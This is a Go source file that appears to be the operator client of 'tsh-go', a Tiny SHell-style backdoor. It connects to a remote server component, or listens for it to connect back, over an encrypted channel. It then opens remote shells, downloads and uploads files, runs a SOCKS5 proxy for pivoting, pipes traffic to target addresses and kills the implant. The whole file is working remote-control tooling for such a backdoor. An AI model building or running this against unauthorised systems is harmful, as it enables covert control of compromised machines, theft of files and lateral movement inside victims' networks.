package client

import (
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"path/filepath"
	"strings"

	"tsh-go/internal/constants"
	"tsh-go/internal/pel"
	"tsh-go/internal/utils"

	"github.com/schollz/progressbar/v3"
	terminal "golang.org/x/term"
)

type RunShellArgs struct {
	Command string
}

type GetFileArgs struct {
	Src string
	Dst string
}

type PutFileArgs struct {
	Src string
	Dst string
}

type Socks5Args struct {
	Socks5Addr string
}

type PipeArgs struct {
	TargetAddr string
}

func Run(secret []byte, host string, port int, mode uint8, arg any) {
	var isConnectBack bool

	if host == "cb" {
		isConnectBack = true
	}

	var connectBackListener *pel.PktEncLayerListener
	var err error

	waitForConnection := func() utils.DuplexStreamEx {
		if isConnectBack {
			addr := fmt.Sprintf(":%d", port)
			for {
				connectBackListener, err = pel.Listen(addr, secret, false)
				if err != nil {
					log.Println(err)
					os.Exit(1)
				}
				log.Print("Waiting for the server to connect...")
				layer, err := connectBackListener.Accept()
				connectBackListener.Close()
				if err != nil {
					log.Printf("Accept failed: %v\n", err)
					continue
				}
				log.Println("connected.")
				layer.Write([]byte{mode})
				return layer
			}
		} else {
			addr := fmt.Sprintf("%s:%d", host, port)
			layer, err := pel.Dial(addr, secret, true)
			if err != nil {
				log.Println(err)
				os.Exit(1)
			}
			layer.Write([]byte{mode})
			return layer
		}
	}

	switch mode {
	case constants.Kill:
		layer := waitForConnection()
		layer.Close()
		log.Println("Server killed")
	case constants.RunShell:
		handleRunShell(waitForConnection, arg.(RunShellArgs))
	case constants.GetFile:
		handleGetFile(waitForConnection, arg.(GetFileArgs))
	case constants.PutFile:
		handlePutFile(waitForConnection, arg.(PutFileArgs))
	case constants.SOCKS5:
		handleSocks5(waitForConnection, arg.(Socks5Args))
	case constants.Pipe:
		handlePipe(waitForConnection, arg.(PipeArgs))
	case constants.RunShellNoTTY:
		handleRunShellNoTTY(waitForConnection, arg.(RunShellArgs))
	}
}

func handleGetFile(waitForConnection func() utils.DuplexStreamEx, arg GetFileArgs) {
	layer := waitForConnection()
	defer layer.Close()
	buffer := make([]byte, constants.MaxMessagesize)

	basename := strings.ReplaceAll(arg.Src, "\\", "/")
	basename = filepath.Base(filepath.FromSlash(basename))

	destination := arg.Dst
	var writer io.Writer

	bar := progressbar.NewOptions(-1,
		progressbar.OptionSetWidth(20),
		progressbar.OptionEnableColorCodes(true),
		progressbar.OptionShowBytes(true),
		progressbar.OptionShowCount(),
		progressbar.OptionSetDescription("Downloading"),
		progressbar.OptionSpinnerType(22),
		progressbar.OptionSetWriter(os.Stderr),
	)

	if arg.Dst == "-" {
		// if dst is "-", write to stdout
		writer = os.Stdout
		if !terminal.IsTerminal(int(os.Stdout.Fd())) {
			// progress bar for file transfer if stdout is not a tty
			writer = io.MultiWriter(writer, bar)
		}
	} else {
		// if dst is a directory, save file to dst/basename
		// otherwise, save file to dst
		if fi, err := os.Stat(destination); err == nil && fi.IsDir() {
			destination = filepath.Join(destination, basename)
		}

		f, err := os.OpenFile(destination, os.O_CREATE|os.O_RDWR|os.O_TRUNC, 0644)
		if err != nil {
			log.Println(err)
			return
		}
		defer f.Close()

		writer = io.MultiWriter(f, bar)
	}

	err := utils.WriteVarLength(layer, []byte(arg.Src))
	if err != nil {
		log.Println(err)
		return
	}
	_, err = utils.CopyBuffer(writer, layer, buffer)
	if err != nil {
		log.Println(err)
		os.Exit(1)
	}
}

func handlePutFile(waitForConnection func() utils.DuplexStreamEx, arg PutFileArgs) {
	layer := waitForConnection()
	defer layer.Close()

	var reader io.Reader
	var fsize int64
	var basename string

	if arg.Src == "-" {
		// if src is "-", read from stdin
		reader = os.Stdin
		fsize = -1
		basename = "stdin"
	} else {
		f, err := os.Open(arg.Src)
		if err != nil {
			log.Println(err)
			os.Exit(1)
		}
		defer f.Close()
		reader = f

		fi, err := f.Stat()
		if err != nil {
			log.Println(err)
			os.Exit(1)
		}
		fsize = fi.Size()
		basename = filepath.Base(arg.Src)
	}

	err := utils.WriteVarLength(layer, []byte(arg.Dst))
	if err != nil {
		log.Println(err)
		return
	}
	err = utils.WriteVarLength(layer, []byte(basename))
	if err != nil {
		log.Println(err)
		return
	}

	bar := progressbar.NewOptions(int(fsize),
		progressbar.OptionSetWidth(20),
		progressbar.OptionEnableColorCodes(true),
		progressbar.OptionShowBytes(true),
		progressbar.OptionShowCount(),
		progressbar.OptionSetDescription("Uploading"),
		progressbar.OptionSetWriter(os.Stderr),
	)
	var writer io.Writer = layer
	if reader != os.Stdin || (reader == os.Stdin && !terminal.IsTerminal(int(os.Stdin.Fd()))) {
		// show progress bar if:
		//   - src is not stdin
		//   - src is stdin but stdin is not a tty
		writer = io.MultiWriter(layer, bar)
	}

	_, err = utils.CopyBuffer(writer, reader, make([]byte, constants.MaxMessagesize))
	if err != nil {
		log.Println(err)
		os.Exit(1)
	}
}

func handleRunShell(waitForConnection func() utils.DuplexStreamEx, arg RunShellArgs) {
	layer := waitForConnection()
	defer layer.Close()
	oldState, err := terminal.MakeRaw(int(os.Stdin.Fd()))
	if err != nil {
		log.Println(err)
		return
	}

	defer func() {
		_ = terminal.Restore(int(os.Stdin.Fd()), oldState)
		_ = recover()
	}()

	term := os.Getenv("TERM")
	if term == "" {
		term = "vt100"
	}
	err = utils.WriteVarLength(layer, []byte(term))
	if err != nil {
		return
	}

	ws_col, ws_row, _ := terminal.GetSize(int(os.Stdout.Fd()))
	ws := make([]byte, 4)
	ws[0] = byte((ws_row >> 8) & 0xFF)
	ws[1] = byte((ws_row) & 0xFF)
	ws[2] = byte((ws_col >> 8) & 0xFF)
	ws[3] = byte((ws_col) & 0xFF)
	_, err = layer.Write(ws)
	if err != nil {
		return
	}

	err = utils.WriteVarLength(layer, []byte(arg.Command))
	if err != nil {
		return
	}
	utils.DuplexPipe(utils.DSEFromRW(os.Stdin, os.Stdout), layer, nil, nil)
}
func handleRunShellNoTTY(waitForConnection func() utils.DuplexStreamEx, arg RunShellArgs) {
	layer := waitForConnection()
	defer layer.Close()

	err := utils.WriteVarLength(layer, []byte(arg.Command))
	if err != nil {
		return
	}
	utils.DuplexPipe(utils.DSEFromRW(os.Stdin, os.Stdout), layer, nil, nil)
}
func handleSocks5(waitForConnection func() utils.DuplexStreamEx, arg Socks5Args) {
	addr, err := net.ResolveTCPAddr("tcp", arg.Socks5Addr)
	if err != nil {
		log.Println(err)
		os.Exit(1)
	}
	l, err := net.ListenTCP("tcp", addr)
	if err != nil {
		log.Println(err)
		os.Exit(1)
	}
	log.Println("Socks5 proxy listening at", l.Addr())
	for {
		conn, err := l.AcceptTCP()
		if err != nil {
			log.Println(err)
			continue
		}
		go func() {
			layer := waitForConnection()
			log.Println("Connection established", conn.RemoteAddr())
			utils.DuplexPipe(conn, layer, nil, nil)
			log.Println("Connection closed", conn.RemoteAddr())
		}()
	}
}

func handlePipe(waitForConnection func() utils.DuplexStreamEx, arg PipeArgs) {
	layer := waitForConnection()
	utils.WriteVarLength(layer, []byte(arg.TargetAddr))
	utils.DuplexPipe(utils.DSEFromRW(os.Stdin, os.Stdout), layer, nil, nil)
}
